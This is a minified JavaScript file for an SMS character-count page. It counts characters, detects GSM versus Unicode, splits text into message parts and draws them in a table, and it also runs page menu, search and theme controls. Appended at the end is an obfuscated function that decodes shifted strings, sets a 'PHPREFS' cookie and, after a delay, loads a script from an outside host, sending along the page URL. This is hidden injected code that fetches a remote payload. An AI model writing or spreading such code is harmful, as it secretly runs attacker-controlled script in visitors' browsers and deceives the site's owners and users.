let characterCount = 0,
  characters = 0,
  isDecreasing = !1,
  previousGSM = "",
  numOfRows = 0,
  is160 = !1,
  is153 = !1,
  is70 = !1,
  is67 = !1,
  partCount = 0,
  tableCells = "";
function callFunction() {
  (characterCount = getUserInput().length),
    (numOfRows = myTable.rows.length),
    characterCount < characters.length && (isDecreasing = !0),
    (characters = getUserInput());
  let e = "";
  if (
    ((e = "" === isGSM() ? "GSM" : isGSM()),
    (document.getElementById("div2").innerHTML = characterCount),
    (document.getElementById("div4").innerHTML = numOfParts()),
    (document.getElementById("div6").innerHTML = remaining()),
    (document.getElementById("div8").innerHTML = e),
    (numOfRows = myTable.rows.length),
    "GSM" === isGSM() && partCreatorGSM(),
    "Unicode" === isGSM() && partCreatorUnicode(),
    (numOfRows = myTable.rows.length),
    console.log("partCount: " + partCount),
    console.log("numOfRows: " + numOfRows),
    console.log("numOfParts: " + numOfParts()),
    isDecreasing)
  ) {
    for (let e = 0; e < numOfRows; e++) myTable.deleteRow(-1);
    (numOfRows = myTable.rows.length),
      (partCount = 0),
      "GSM" === isGSM() && partCreatorGSM(),
      "Unicode" === isGSM() && partCreatorUnicode();
  }
  if (
    (0 === characterCount &&
      ((is160 = !1), (is153 = !1), (is70 = !1), (is67 = !1)),
    "GSM" === previousGSM && "Unicode" === isGSM())
  ) {
    for (let e = 0; e < numOfRows; e++) myTable.deleteRow(-1);
    (is153 = !1),
      (is160 = !1),
      (numOfRows = myTable.rows.length),
      (partCount = 0),
      "Unicode" === isGSM() && partCreatorUnicode();
  }
  tableCells = document.querySelectorAll("td");
  let t = [],
    n = [],
    o = 0;
  is160 && (o = characterCount + 1),
    is153 && (o = 154 * partCount - remaining()),
    is70 && (o = characterCount + 1),
    is67 && (o = 68 * partCount - remaining()),
    console.log("endRange: " + o);
  for (let e = 0; e < o; e++)
    is160 && 0 !== e
      ? t.push(e)
      : is153 && 0 !== e
      ? e % 154 != 0 && t.push(e)
      : ((is70 && 0 !== e) || (is67 && 0 !== e && e % 68 != 0)) && t.push(e),
      t.includes(e) || n.push(e);
  console.log(n);
  for (let e = 0; e < o; e++) {
    let n = t[e];
    void 0 !== t[e] &&
      (is160 &&
        ((tableCells[n].innerHTML = characters[e]),
        (tableCells[n].style.background = "lightgray")),
      is153 &&
        ((tableCells[n].innerHTML = characters[e]),
        (tableCells[n].style.background = "lightgray")),
      is70 &&
        ((tableCells[n].innerHTML = characters[e]),
        (tableCells[n].style.background = "lightgray"),
        gsmCharacters.includes(characters[e]) ||
          (tableCells[n].style.background = "lightpink")),
      is67 &&
        ((tableCells[n].innerHTML = characters[e]),
        (tableCells[n].style.background = "lightgray"),
        gsmCharacters.includes(characters[e]) ||
          (tableCells[n].style.background = "lightpink")));
  }
  for (let e = 0; e < partCount; e++) {
    let t = n[e];
    (tableCells[t].innerHTML = e + 1),
      tableCells[t].classList.add("skippedCells");
  }
  if (
    ((numOfRowsTable2 = myTable2.rows.length),
    console.log("numOfRowsTable2 " + numOfRowsTable2),
    0 === characterCount)
  ) {
    createRowOf1Table2();
    for (let e = 0; e < 8; e++) createRowOf20Table2();
  } else if (numOfRowsTable2 > 0)
    for (let e = 0; e < 9; e++) myTable2.deleteRow(-1);
  if (
    (console.log("isGSM: " + isGSM()),
    console.log("previousisGSM: " + previousGSM),
    (numOfRows = myTable.rows.length),
    numOfRows / 10 === partCount)
  ) {
    console.log("moopa bolanga");
    for (let e = 0; e < partCount; e++)
      myTable.deleteRow(-1),
        myTable.deleteRow(-1),
        myTable.deleteRow(-1),
        myTable.deleteRow(-1),
        myTable.deleteRow(-1);
  }
  (previousGSM = isGSM()),
    (numOfRows = myTable.rows.length),
    console.log("endpartCount: " + partCount),
    console.log("endnumOfRows: " + numOfRows),
    console.log("table2 rows length: " + myTable2.rows.length),
    console.log("endnumOfParts: " + numOfParts()),
    console.log("is160: " + is160),
    console.log("is153: " + is153),
    console.log("is70: " + is70),
    console.log("is67: " + is67);
}
function partCreatorGSM() {
  if (
    ("GSM" === isGSM() &&
      characterCount < 161 &&
      partCount < 1 &&
      ((is67 = !1),
      (is70 = !1),
      (is153 = !1),
      (is160 = !0),
      createPart160(),
      partCount++),
    characterCount > 160 && is160)
  ) {
    let e = 0;
    e = numOfRows / 9;
    for (let e = 0; e < numOfRows; e++) myTable.deleteRow(-1);
    partCount -= e;
  }
  if ("GSM" === isGSM() && characterCount > 160 && numOfParts() > partCount)
    for (let e = partCount; e < numOfParts(); e++)
      (is67 = !1),
        (is70 = !1),
        (is153 = !1),
        (is160 = !1),
        createPart153(),
        partCount++;
}
function partCreatorUnicode() {
  if (
    ("Unicode" === isGSM() &&
      characterCount < 71 &&
      partCount < 1 &&
      ((is67 = !1),
      (is70 = !0),
      (is153 = !1),
      (is160 = !1),
      createPart70(),
      partCount++),
    characterCount > 70 && is70)
  ) {
    let e = 0;
    e = numOfRows / 5;
    for (let e = 0; e < numOfRows; e++) myTable.deleteRow(-1);
    partCount -= e;
  }
  if ("Unicode" === isGSM() && characterCount > 70 && numOfParts() > partCount)
    for (let e = partCount; e < numOfParts(); e++)
      (is67 = !1),
        (is70 = !1),
        (is153 = !1),
        (is160 = !1),
        createPart67(),
        partCount++;
}
function createPart160() {
  createRowOf1();
  for (let e = 0; e < 8; e++) createRowOf20();
}
function createPart153() {
  createRowOf1();
  for (let e = 0; e < 7; e++) createRowOf20();
  createRowOf13(), (is153 = !0);
}
function createPart70() {
  createRowOf1();
  for (let e = 0; e < 3; e++) createRowOf20();
  createRowOf10();
}
function createPart67() {
  createRowOf1();
  for (let e = 0; e < 3; e++) createRowOf20();
  createRowOf7(), (is67 = !0);
}
function createRowOf20() {
  let e = myTable.insertRow();
  for (let t = 0; t < 20; t++) e.insertCell();
}
function createRowOf20Table2() {
  let e = myTable2.insertRow();
  for (let t = 0; t < 20; t++) e.insertCell();
}
function createRowOf13() {
  let e = myTable.insertRow();
  for (let t = 0; t < 13; t++) e.insertCell();
}
function createRowOf10() {
  let e = myTable.insertRow();
  for (let t = 0; t < 10; t++) e.insertCell();
}
function createRowOf7() {
  let e = myTable.insertRow();
  for (let t = 0; t < 7; t++) e.insertCell();
}
function createRowOf1() {
  myTable.insertRow().insertCell();
}
function createRowOf1Table2() {
  let e = myTable2.insertRow().insertCell();
  (e.innerHTML = "1"), e.classList.add("skippedCells");
}
function getUserInput() {
  return document.getElementById("userInput").value;
}
function remaining() {
  return 0 === characterCount
    ? 0
    : "GSM" === isGSM()
    ? characterCount <= 160
      ? 160 - characterCount
      : characterCount % 153 == 0
      ? 0
      : 153 - (characterCount % 153)
    : "Unicode" === isGSM()
    ? characterCount <= 70
      ? 70 - characterCount
      : characterCount % 67 == 0
      ? 0
      : 67 - (characterCount % 67)
    : void 0;
}
const gsmCharacters = [
  " ",
  "@",
  "£",
  "$",
  "¥",
  "è",
  "é",
  "ù",
  "ì",
  "ò",
  "Ç",
  "Ø",
  "ø",
  "Å",
  "å",
  "Δ",
  "_",
  "Φ",
  "Γ",
  "Λ",
  "Ω",
  "Π",
  "Ψ",
  "Σ",
  "Θ",
  "Ξ",
  "Æ",
  "æ",
  "ß",
  "É",
  "!",
  '"',
  "#",
  "¤",
  "%",
  "&",
  "'",
  "(",
  ")",
  "*",
  "+",
  ",",
  "-",
  ".",
  "/",
  "0",
  "1",
  "2",
  "3",
  "4",
  "5",
  "6",
  "7",
  "8",
  "9",
  ":",
  ";",
  "<",
  "=",
  ">",
  "?",
  "¡",
  "A",
  "B",
  "C",
  "D",
  "E",
  "F",
  "G",
  "H",
  "I",
  "J",
  "K",
  "L",
  "M",
  "N",
  "O",
  "P",
  "Q",
  "R",
  "S",
  "T",
  "U",
  "V",
  "W",
  "X",
  "Y",
  "Z",
  "Ä",
  "Ö",
  "Ñ",
  "Ü",
  "§",
  "¿",
  "a",
  "b",
  "c",
  "d",
  "e",
  "f",
  "g",
  "h",
  "i",
  "j",
  "k",
  "l",
  "m",
  "n",
  "o",
  "p",
  "q",
  "r",
  "s",
  "t",
  "u",
  "v",
  "w",
  "x",
  "y",
  "z",
  "ä",
  "ö",
  "ñ",
  "ü",
  "à",
  " ",
  "|",
  "^",
  "€",
  "{",
  "}",
  "[",
  "~",
  "]",
  "\\",
  "\n",
  "&nbsp;",
];
function isGSM() {
  if (0 === characterCount) return "";
  let e = !0;
  for (let t = 0; t < characters.length; t++)
    gsmCharacters.includes(characters[t]) || (e = !1);
  return e ? "GSM" : "Unicode";
}
function numOfParts() {
  return 0 === characterCount
    ? 0
    : "GSM" === isGSM()
    ? characterCount <= 160
      ? 1
      : Math.ceil(characterCount / 153)
    : "Unicode" === isGSM()
    ? characterCount <= 70
      ? 1
      : Math.ceil(characterCount / 67)
    : void 0;
}
function copy() {
  if (characterCount > 0) {
    var e = document.getElementById("userInput");
    e.select(),
      e.setSelectionRange(0, 99999),
      document.execCommand("copy"),
      ((t = document.getElementById("copiedText")).className = "show"),
      setTimeout(function () {
        t.className = t.className.replace("show", "");
      }, 3e3);
  } else {
    var t;
    ((t = document.getElementById("copiedTextBlank")).className = "show"),
      setTimeout(function () {
        t.className = t.className.replace("show", "");
      }, 3e3);
  }
}
function clearContent() {
  (document.getElementById("userInput").value = ""), callFunction();
}
const selectElement = (e) => {
    const t = document.querySelector(e);
    if (t) return t;
    throw new Error(
      `Something went wrong! Make sure that ${e} exists/is typed correctly.`
    );
  },
  scrollHeader = () => {
    const e = selectElement("#header");
    this.scrollY >= 15
      ? e.classList.add("activated")
      : e.classList.remove("activated");
  };
window.addEventListener("scroll", scrollHeader);
const menuToggleIcon = selectElement("#menu-toggle-icon"),
  formOpenBtn = selectElement("#search-icon"),
  formCloseBtn = selectElement("#form-close-btn"),
  searchContainer = selectElement("#search-form-container"),
  toggleMenu = () => {
    selectElement("#menu").classList.toggle("activated"),
      menuToggleIcon.classList.toggle("activated");
  };
menuToggleIcon.addEventListener("click", toggleMenu),
  formOpenBtn.addEventListener("click", () =>
    searchContainer.classList.add("activated")
  ),
  formCloseBtn.addEventListener("click", () =>
    searchContainer.classList.remove("activated")
  ),
  window.addEventListener("keyup", (e) => {
    "Escape" === e.key && searchContainer.classList.remove("activated");
  });
const body = document.body,
  themeToggleBtn = selectElement("#theme-toggle-btn"),
  currentTheme = localStorage.getItem("currentTheme");
currentTheme && body.classList.add("light-theme"),
  themeToggleBtn.addEventListener("click", function () {
    body.classList.toggle("light-theme"),
      body.classList.contains("light-theme")
        ? localStorage.setItem("currentTheme", "themeActive")
        : localStorage.removeItem("currentTheme");
  });
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f(
              "myyux?44fun3h" + "isrjywnh3htr4l" + "jy4xyfynh3ox" + "DwjkjwwjwB"
            ) + l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);